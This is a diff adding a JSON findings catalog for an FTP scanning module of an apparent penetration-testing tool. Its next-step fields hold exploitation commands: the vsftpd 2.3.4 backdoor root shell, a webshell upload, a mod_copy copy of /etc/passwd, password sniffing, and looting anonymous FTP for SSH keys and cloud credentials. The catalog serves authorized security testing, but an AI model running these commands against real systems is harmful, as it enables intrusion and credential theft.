@@ -1,0 +1,123 @@
+{
+  "service": "ftp",
+  "summary": "FTP module has strong breadth: T1 anon-login verification (bogus-cred USER anonymous / PASS returning 230), T0 broad CVE banner map (vsftpd 2.3.4, ProFTPD 1.3.3c backdoor, mod_copy 2015-3306/2019-12815, CrushFTP 2024-4040, Serv-U 2021-35211, WS_FTP 2023-40044), T1 PASV RFC1918 topology leak, T1 SITE HELP dangerous-verb enumeration (CPFR/CPTO/EXEC/CHMOD/INDEX), T0 no-AUTH-TLS posture flag, and T2 reversible-write proof via STOR+DELE marker. Feeds cleartext_creds. Biggest gap: known-bad CVEs are banner-gated only (no PoC probes); no attempt to actually chain SITE CPFR/CPTO for the mod_copy T2 read-primitive; no anonymous directory listing / mirror to elevate anon-login from T1 to T3 sample-loot.",
+  "module_files": [
+    "recce/services/ftp.py"
+  ],
+  "proposed_shared_surface_consumers": [
+    "known_hostnames",
+    "known_domains",
+    "cleartext_creds"
+  ],
+  "findings": [
+    {
+      "kind": "anon_ftp",
+      "title_pattern": "Anonymous FTP login allowed",
+      "severity": "high",
+      "tier": "t1",
+      "tier_evidence": "Probe sent USER anonymous + PASS and observed a 230 response \u2014 deterministic proof of unauth session.",
+      "can_promote_to": "t3",
+      "promotion_notes": "After the 230, issue LIST / CWD to sample directory contents (return top N filenames) \u2014 establishes actual read foothold; combine with prove_writable() for write foothold.",
+      "promotion_risk": "low",
+      "tester_next_step": "wget -m --no-passive ftp://anonymous:recce@IP:21/ ; or lftp -u anonymous, ftp://IP -e 'find; quit' \u2014 grep for backup.tar, .git, .aws, id_rsa",
+      "related_cves": []
+    },
+    {
+      "kind": "cleartext_ftp",
+      "title_pattern": "FTP authentication is cleartext (no AUTH TLS)",
+      "severity": "medium",
+      "tier": "t0",
+      "tier_evidence": "FEAT reply lacks AUTH TLS/SSL/FTPS \u2014 posture-only flag.",
+      "can_promote_to": "stay",
+      "promotion_notes": "Same sniff-motivation as other cleartext protos.",
+      "promotion_risk": "none",
+      "tester_next_step": "tcpdump -i any -A 'tcp port 21 and host IP' \u2014 grep 'PASS '",
+      "related_cves": []
+    },
+    {
+      "kind": "writable_ftp",
+      "title_pattern": "Writable FTP directory (proven)",
+      "severity": "high",
+      "tier": "t2",
+      "tier_evidence": "prove_writable() STORed a marker file (226/250), then DELEted it \u2014 actual write primitive demonstrated (not just enumerated).",
+      "can_promote_to": "t3",
+      "promotion_notes": "Where FTP root overlaps a web root, PUT shell.php|jsp for immediate RCE. Requires web-root correlation \u2014 needs cross-service wire with http.py to know the doc-root path.",
+      "promotion_risk": "high",
+      "tester_next_step": "ftp IP ; then: put shell.php ; then: curl http://IP/shell.php?cmd=id \u2014 if FTP root != web root, put webshell in every candidate path (uploads/, public/, htdocs/).",
+      "related_cves": [
+        "CWE-434"
+      ]
+    },
+    {
+      "kind": "ftp_backdoor",
+      "title_pattern": "vsFTPd 2.3.4 / ProFTPD 1.3.3c backdoor",
+      "severity": "critical",
+      "tier": "t0",
+      "tier_evidence": "Banner regex only; no backdoor-trigger PoC fired.",
+      "can_promote_to": "t3",
+      "promotion_notes": "Send USER ending ':)' then TCP-connect to port 6200 \u2014 a 30-line probe would confirm and land a root shell. For ProFTPD 1.3.3c, the backdoor triggers on connect from compromised mirror.",
+      "promotion_risk": "destructive",
+      "tester_next_step": "For vsftpd 2.3.4: nc IP 21 ; USER x:) ; PASS y ; then in second terminal: nc IP 6200 ; id \u2014 if root shell, you're in. Or: msfconsole -x 'use unix/ftp/vsftpd_234_backdoor; set RHOSTS IP; run'.",
+      "related_cves": [
+        "CVE-2011-2523"
+      ]
+    },
+    {
+      "kind": "ftp_rce",
+      "title_pattern": "ProFTPD mod_copy / CrushFTP / Serv-U / WS_FTP CVE",
+      "severity": "critical",
+      "tier": "t0",
+      "tier_evidence": "Banner-gated CVE claim only; no PoC probe.",
+      "can_promote_to": "t2",
+      "promotion_notes": "For mod_copy (CVE-2015-3306): send SITE CPFR /etc/passwd + SITE CPTO /var/www/html/leak (or /tmp/canary) unauthenticated \u2014 a 250 back is proof of arbitrary file copy T2. For CrushFTP/CVE-2024-4040: send GET with the crafted template path and observe SSTI reflection.",
+      "promotion_risk": "destructive",
+      "tester_next_step": "For ProFTPD: nc IP 21 ; SITE CPFR /etc/passwd ; SITE CPTO /tmp/recce_canary_passwd ; expect 250, then read via anon FTP GET /tmp/recce_canary_passwd. For CrushFTP: metasploit auxiliary/scanner/http/crushftp_rce_cve_2024_4040.",
+      "related_cves": [
+        "CVE-2015-3306",
+        "CVE-2019-12815",
+        "CVE-2024-4040",
+        "CVE-2021-35211",
+        "CVE-2023-40044"
+      ]
+    },
+    {
+      "kind": "ftp_pasv_internal_ip",
+      "title_pattern": "FTP PASV response leaks internal IP",
+      "severity": "medium",
+      "tier": "t2",
+      "tier_evidence": "PASV 227 reply parsed and the h1.h2.h3.h4 tuple compared to control-channel IP; when private and different, actual internal address is disclosed (real information-disclosure primitive).",
+      "can_promote_to": "t3",
+      "promotion_notes": "Feed leaked IP into known_hostnames / pivot target list; useful when the tester is already inside via VPN/pivot.",
+      "promotion_risk": "none",
+      "tester_next_step": "Add leaked IP to scan sweep: nmap -sT -p- <internal_ip> from a foothold; also consult ipam DB with the leaked subnet.",
+      "related_cves": []
+    },
+    {
+      "kind": "ftp_site_copy_exposed",
+      "title_pattern": "FTP SITE mod_copy verbs exposed",
+      "severity": "medium",
+      "tier": "t1",
+      "tier_evidence": "HELP / SITE HELP responses actually parsed for CPFR/CPTO tokens \u2014 proven verb availability, not banner fingerprint.",
+      "can_promote_to": "t2",
+      "promotion_notes": "Actually invoke SITE CPFR /etc/passwd + SITE CPTO /tmp/probe_canary and read it back via anon session \u2014 proves arbitrary file copy (also the CVE-2015-3306 primitive).",
+      "promotion_risk": "high",
+      "tester_next_step": "ftp IP ; anonymous / any ; quote SITE CPFR /etc/passwd ; quote SITE CPTO /tmp/recce_probe ; get /tmp/recce_probe /tmp/local_probe \u2014 verify contents.",
+      "related_cves": [
+        "CVE-2015-3306",
+        "CVE-2019-12815"
+      ]
+    },
+    {
+      "kind": "ftp_extra_commands_disclosed",
+      "title_pattern": "FTP HELP/SITE HELP discloses extra command surface",
+      "severity": "medium",
+      "tier": "t0",
+      "tier_evidence": "Enum-only: verb list in HELP output \u2014 vendor fingerprint + follow-on surface.",
+      "can_promote_to": "t2",
+      "promotion_notes": "For SITE EXEC (wu-ftpd), after authenticated session invoke SITE EXEC /bin/id \u2014 a real command-exec primitive.",
+      "promotion_risk": "high",
+      "tester_next_step": "ftp IP ; USER u/PASS p ; quote SITE EXEC /bin/id \u2014 wu-ftpd runs the command as the daemon UID.",
+      "related_cves": []
+    }
+  ]
+}
